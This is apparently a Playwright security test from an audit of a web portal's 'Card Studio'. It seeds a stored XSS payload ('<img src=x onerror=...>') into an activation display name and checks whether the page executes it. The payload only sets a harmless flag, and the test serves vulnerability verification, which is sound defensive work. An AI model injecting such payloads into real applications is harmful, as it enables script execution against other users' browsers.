/* Lead 2: the activation display name renders unescaped in Card Studio.
   The token-to-store path is source-confirmed; this proves the sink by
   persisting the same shape /api/activate writes (linkFromToken). */
import fs from 'node:fs';
import { chromium } from 'playwright';
import { startPortal, session, mint, guard, sleep } from './lib.mjs';

guard('xss-activation', async () => {
  const p = await startPortal({ STUDIO_PASSPHRASE: 'testpassphrase' });
  try {
    const cookie = await session(p.base);
    await mint(p.base, cookie, { slug: 'xsstact.t', name: 'XSS Activation', status: 'active', pens: [{ template: 'glow' }] });

    const marker = '<img src=x onerror=window.__xss=2>';
    const file = process.env.CARD_FILE || '/work/cards.json';
    const all = JSON.parse(fs.readFileSync(file, 'utf8'));
    all['xsstact.t'].activatedBy = {
      uid: 'audit-uid',
      provider: 'google.com',
      name: marker,
      at: new Date().toISOString(),
    };
    fs.writeFileSync(file, JSON.stringify(all));

    const browser = await chromium.launch();
    const ctx = await browser.newContext();
    await ctx.request.post(`${p.base}/api/session`, { data: { passphrase: 'testpassphrase' } });
    const page = await ctx.newPage();
    const errors = [];
    page.on('pageerror', e => errors.push(e.message));
    await page.goto(`${p.base}/studio/`);
    await page.waitForSelector('tr[data-slug="xsstact.t"]', { timeout: 15000 });
    await page.click('[data-link="xsstact.t"]');
    await sleep(800);

    const executed = await page.evaluate(() => window.__xss === 2);
    const html = await page.evaluate(() =>
      document.querySelector('tr.link-detail[data-slug="xsstact.t"]')?.innerHTML || '');
    const text = await page.evaluate(() =>
      document.querySelector('tr.link-detail[data-slug="xsstact.t"]')?.textContent || '');
    await browser.close();

    const rendered = text.includes(marker);
    const expect = process.env.EXPECT || 'vulnerable';
    return {
      ok: expect === 'blocked' ? (!executed && rendered) : executed,
      executed,
      rendered_as_text: rendered,
      marker_in_dom: html.includes(marker),
      proof: 'sink execution; activatedBy seeded in the same shape linkFromToken writes',
      page_errors: errors,
    };
  } finally {
    p.stop();
  }
});
